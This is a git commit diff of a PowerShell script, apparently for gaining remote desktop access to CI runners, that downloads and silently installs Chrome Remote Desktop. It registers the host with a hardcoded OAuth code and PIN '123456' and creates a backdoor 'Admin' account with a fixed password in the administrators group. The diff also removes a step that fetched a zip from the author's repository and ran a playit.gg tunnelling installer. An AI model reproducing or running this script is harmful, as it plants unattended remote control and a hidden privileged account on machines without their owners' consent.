759e2e615c39b9707e92c9a7379134c8d2d62277
Usser1222 <163659668+Usser1222@users.noreply.github.com>
2024-03-17 01:02:23 +0300

    Update 0.ps1

--- 0.ps1
+++ 0.ps1
@@ -1,12 +1,6 @@
 & {$P = $env:TEMP + '\chromeremotedesktophost.msi'; Invoke-WebRequest 'https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi' -OutFile $P; Start-Process $P -Wait; Remove-Item $P}
 
-curl -o zip.zip -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/zip.zip"
-& "${Env:PROGRAMFILES(X86)}\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="4/0AeaYSHAs48VfgbVbKI0xl3Yk1jtTj72CYYvYDYNFAuBvVyOIACb6J1nWQntZEpQqRdQ70A" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$Env:COMPUTERNAME --pin=123456
-
-unzip zip.zip
-./playit-windows-x86_64-signed.msi /Silent
+& "${Env:PROGRAMFILES(X86)}\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="4/0AeaYSHBLXh6ejI2sOb7PjM4jD-o8loRxA3eD_G4BYpoCM4TeVaLGW-pYdhwhAs3wMSqjZQ" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$Env:COMPUTERNAME --pin=123456
 
 cmd /c net user /add Admin P@ssw0rd.
 cmd /c net localgroup /add administrators Admin
-
-cmd /c %ProgramFiles%\playit_gg\playit.exe
